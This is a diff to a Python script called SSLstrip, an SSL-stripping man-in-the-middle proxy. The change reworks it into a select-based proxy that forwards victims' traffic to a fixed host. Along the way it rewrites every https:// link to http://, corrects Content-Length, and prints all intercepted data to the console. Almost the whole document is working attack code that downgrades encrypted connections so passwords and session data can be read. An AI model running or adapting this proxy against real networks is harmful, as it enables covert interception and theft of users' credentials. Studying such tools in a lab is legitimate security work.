@@ -12,10 +12,7 @@ __license__ = 'GPL'
 __status__  = 'Development'
 
 
-import socket
-import ssl
-import sys
-import re
+import select, socket, ssl, sys, re
 
 HTTPS_URL           = [b'/index.html']
 FORWARD_HOST        = 'www.t0x0sh.org'
@@ -26,86 +23,94 @@ PROXY_PORT          = 4242
 BUFFER_SIZE         = 65537
 
 class SSLstrip:
+    def __init__(self):
+        self.__csockets = dict()
+
+    def __close_conn(self, s):
+        if s is not None:
+            s.close()
+            del self.__csockets[s]
+
     def __listen(self):
-        """ Create the listenning socket for Proxy
-        """
         sock = socket.socket()
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((PROXY_HOST, PROXY_PORT))
         sock.listen(5)
-        self.__sock = sock
+        self.__listen_sock = sock
 
-    def __https_sock(self):
+    def __new_https_conn(self, csock):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ssl_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
         sock = ssl_ctx.wrap_socket(sock, server_hostname=FORWARD_HOST)
         sock.connect((FORWARD_HOST, FORWARD_HTTPS_PORT))
-        sock.settimeout(2)
-        return sock
+        self.__csockets[csock] = sock
+        self.__csockets[sock] = csock
 
-    def __http_sock(self):
+    def __new_http_conn(self, csock):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((FORWARD_HOST, FORWARD_HTTP_PORT))
-        sock.settimeout(2)
-        return sock
+        self.__csockets[csock] = sock
+        self.__csockets[sock] = csock
 
     def __replace_https_to_http(self, data):
         return re.sub(b'https://', b'http://', data)
 
-    def __handle_client(self, csock, fromaddr):
-        """ Handle clients connections, and forward requests.
-        """
-        csock.settimeout(2)
-        fw_sock = None
+    def __replace_content_length(self, data):
+        try:
+            idx = data.index(b"\r\n\r\n")
+            length = len(data) - idx - 4
+            return re.sub(b'Content-Length: (\d+)',
+                          b'Content-Length: %d' % length, data, 1)
+        except:
+            return data
 
-        while True:
-            data = csock.recv(BUFFER_SIZE)
-            if len(data) == 0:
-                if fw_sock is not None:
-                    fw_sock.close()
-                break
-
+    def __recv(self, csock):
+        fw_sock = self.__csockets[csock]
+        data = csock.recv(BUFFER_SIZE)
+        if len(data) == 0:
+            self.__close_conn(csock)
+            self.__close_conn(fw_sock)
+        else:
             print(data)
 
             if fw_sock is None:
                 m = re.search(b'(GET|POST) (\S+) HTTP/\d.\d', data)
                 if m is not None and m.group(2) in HTTPS_URL:
-                    fw_sock = self.__https_sock()
+                    self.__new_https_conn(csock)
                 else:
-                    fw_sock = self.__http_sock()
-
+                    self.__new_http_conn(csock)
+                fw_sock = self.__csockets[csock]
+            data = self.__replace_https_to_http(data)
+            data = self.__replace_content_length(data)
             fw_sock.send(data)
 
-            data = fw_sock.recv(BUFFER_SIZE)
-            while len(data) > 0:
-                data = self.__replace_https_to_http(data)
-                csock.send(data)
-                data = fw_sock.recv(BUFFER_SIZE)
-
     def __accept(self):
-        """ Infinite loop, accepting new client connections
-        """
-        while True:
-            csock, fromaddr = self.__sock.accept()
-            caddr, cport = fromaddr
+        csock, fromaddr = self.__listen_sock.accept()
+        caddr, cport = fromaddr
+        print("New client connected %s:%d" % (caddr, cport))
+        self.__csockets[csock] = None
 
-            print("New client connected %s:%d" % (caddr, cport))
+    def __sockets(self):
+        return [s for s in self.__csockets] + [self.__listen_sock]
 
-            try:
-                self.__handle_client(csock, fromaddr)
-            except Exception as e:
-                print("error:", e)
-
-            csock.close()
-            print("Client %s:%d deconnected" % (caddr, cport))
+    def __csockets_timeout(self):
+        for s in [k for k in self.__csockets]:
+            self.__close_conn(s)
 
     def run(self):
-        """ Run the proxy...
-        """
         self.__listen()
         print("Proxy listenning on %s:%d" % (PROXY_HOST, PROXY_PORT))
-        self.__accept()
 
+        while True:
+            (reads, _, _) = select.select(self.__sockets(), [], [], 2.0)
+
+            if len(reads) == 0:
+                self.__csockets_timeout()
+            for s in reads:
+                if s == self.__listen_sock:
+                    self.__accept()
+                else:
+                    self.__recv(s)
 
 if __name__ == "__main__":
     sslstrip = SSLstrip()
